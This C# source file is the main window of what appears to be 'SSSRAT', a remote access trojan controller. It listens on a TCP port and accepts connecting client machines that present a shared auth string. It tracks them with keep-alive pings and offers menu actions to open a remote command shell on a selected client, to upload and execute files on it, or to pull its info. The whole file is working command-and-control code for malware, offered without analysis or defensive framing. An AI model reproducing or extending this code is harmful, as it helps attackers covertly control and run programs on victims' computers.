using System;
using System.Drawing;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;
using Public;

namespace SSSRAT_GUI {
	public partial class FrmMain : Form {
		public FrmMain() {
			InitializeComponent();
		}

		
		TcpListener listener;
		static uint idIncrement;
		static bool isListening;

		#region Threads
		void KeepAlive(object Client) {
			var client = (Client)Client;
			while (client.tcp != null && client.tcp.Connected) {
				var readBuff = new byte[2];
				try {
					var stm = client.tcp.GetStream();
					_.Send(stm, _.GB("COM" + _.SPLITTER + "KA"));
					readBuff = _.Recv(stm, 2);
				} catch {
					RemoveClient(client);
				}
				if (_.GS(readBuff) != "ON") {
					RemoveClient(client);
				}
				ToLog("KA done for " + client.id);
				Thread.Sleep(20000);
			}
			RemoveClient(client);
		}

		void ListenThread() {
			listener = new TcpListener(IPAddress.Any, _.port);
			listener.Start();
			while (isListening) {
				try {
					TcpClient client = listener.AcceptTcpClient();
					new Thread(ListenHandle).Start(client);
				} catch {
				}
			}

		}

		void ListenHandle(object Client) {
			var client = (TcpClient)Client;
			var stm = client.GetStream();
			_.Send(stm, _.GB("READY"));
			byte[] readBuff = _.Recv(stm, _.MAX_BUFFER);
			if (_.CleanOs(_.GS(readBuff)) != t_auth.Text) {
				string ip = client.Client.RemoteEndPoint.ToString();
				client.Close();
				ToLog("AUTH failed for " + ip + " GOT " + _.CleanOs(_.GS(readBuff)) + " EXPECTED " + t_auth.Text);
				return;
			}
			_.Send(stm, _.GB("S"));
			AddClient(client);
		}
		#endregion

		#region Funcs
		void AddClient(TcpClient client) {
			for (int x = 0; x < _.clients.Count; x++) {
				if (_.clients[x].tcp.Client.Equals(client.Client)) {
					return;
				}
			}
			var item = new ListViewItem("ID: " + ++idIncrement + ", IP: " + client.Client.RemoteEndPoint);
			var cl = new Client(idIncrement, client, new Thread(KeepAlive), item);
			cl.ka.Start(cl);
			_.clients.Add(cl);
			Invoke(new MethodInvoker(() => list_clients.Items.Add(item)));
			ToLog("ID " + cl.id + " (" + cl.tcp.Client.RemoteEndPoint + ") ready for duty!");
		}

		void RemoveClient(Client client) {
			Invoke(new MethodInvoker(() => list_clients.Items.Remove(client.lvi)));
			_.clients.Remove(client);
			ToLog("ID " + client.id + (client.tcp.Client.RemoteEndPoint != null ?
									   "(" + client.tcp.Client.RemoteEndPoint + ")"
									   : "") + " has deserted!");
		}

		Client GetClientByLVItem(ListViewItem item) {
			string text = item.Text;
			for (int x = 0; x < _.clients.Count; x++) {
				if (text == "ID: " + _.clients[x].id + ", IP: " + _.clients[x].tcp.Client.RemoteEndPoint) {

					return _.clients[x];
				}
			}
			return new Client(UInt32.MaxValue, new TcpClient(), new Thread(KeepAlive), new ListViewItem());
		}

		Client GetCurrentSelectedClient() {
			return GetClientByLVItem(list_clients.Items[list_clients.SelectedIndices[0]]);
		}

		static string delayLog = "";
		static void ToLog(string str) {
			string toWr = DateTime.Now.Hour + ":" + DateTime.Now.Minute + ":" + DateTime.Now.Second + "." +
			              DateTime.Now.Millisecond + "\t\t" + str + "\r\n";
			try {
				System.IO.File.AppendAllText(Application.StartupPath + "\\log.log", toWr);
			} catch {
				delayLog += toWr;
				new Thread(() => {
					while (true) {
						try {
							System.IO.File.AppendAllText(Application.StartupPath + "\\log.log", delayLog);
							delayLog = "";
							return;
						} catch { }
						Thread.Sleep(100);
					}
				}).Start();
			}
		}


		#endregion

		#region Forms
		void TPortLeave(object sender, EventArgs e) {
			if (t_port.Text == "") {
				t_port.Text = "Port";
				t_port.ForeColor = Color.Gray;
				t_port.Font = new Font(t_port.Font.FontFamily,
											 t_port.Font.Size,
											 FontStyle.Italic);
			} else {
				try {
					if (Int32.Parse(t_port.Text) > 65535) {
						t_port.Text = "65535";
					}
					_.port = Int32.Parse(t_port.Text);
				} catch {
					t_port.Text = "13337";
				}
			}
		}

		void BStartListeningClick(object sender, EventArgs e) {
			isListening = true;
			l_listeningOn.Text = "Listening on: " + _.port;
			l_listeningOn.ForeColor = Color.Green;
			new Thread(ListenThread).Start();
		}

		private void BStopListeningClick(object sender, EventArgs e) {
			isListening = false;
			listener.Stop();
			l_listeningOn.Text = "Listening on: N/A";
			l_listeningOn.ForeColor = Color.Red;
		}

		private void TAuthLeave(object sender, EventArgs e) {
			if (t_auth.Text == "") {
				t_auth.Text = "Auth";
				t_auth.ForeColor = Color.Gray;
				t_auth.Font = new Font(t_auth.Font.FontFamily,
											 t_auth.Font.Size,
											 FontStyle.Italic);
			}
		}

		private void TAuthEnter(object sender, EventArgs e) {
			if (t_auth.Text == "" || t_auth.Text == "Auth") {
				t_auth.Text = String.Empty;
				t_auth.ForeColor = Color.Black;
				t_auth.Font = new Font(t_auth.Font.FontFamily,
											 t_auth.Font.Size,
											 FontStyle.Regular);
			}
		}

		void TPortEnter(object sender, EventArgs e) {
			if (t_port.Text == "" || t_port.Text == "Port") {
				t_port.Text = String.Empty;
				t_port.ForeColor = Color.Black;
				t_port.Font = new Font(t_port.Font.FontFamily,
											 t_port.Font.Size,
											 FontStyle.Regular);
			}
		}

		private void ListClientsMouseClick(object sender, MouseEventArgs e) {
			if (e.Button == MouseButtons.Right) {
				if (list_clients.FocusedItem.Bounds.Contains(e.Location)) {
					Client selectedClient = GetClientByLVItem(list_clients.Items[list_clients.SelectedIndices[0]]);
					l_menu_id.Text = "ID: " + selectedClient.id;
					if (selectedClient.id == UInt32.MaxValue) {
						cMDToolStripMenuItem.Enabled = false;
						uplExecuteToolStripMenuItem.Enabled = false;
						infoToolStripMenuItem.Enabled = false;
						l_menu_id.Text = "ID: N/A";
					}
					cMDToolStripMenuItem.Enabled = true;
					uplExecuteToolStripMenuItem.Enabled = true;
					infoToolStripMenuItem.Enabled = true;
					menu_client.Show(Cursor.Position);
				}
			}
		}

		private void CMDToolStripMenuItemClick(object sender, EventArgs e) {
			var cmd = new FrmCMD();
			cmd.Init(GetCurrentSelectedClient());
			cmd.Show();
		}
		#endregion
	}
}
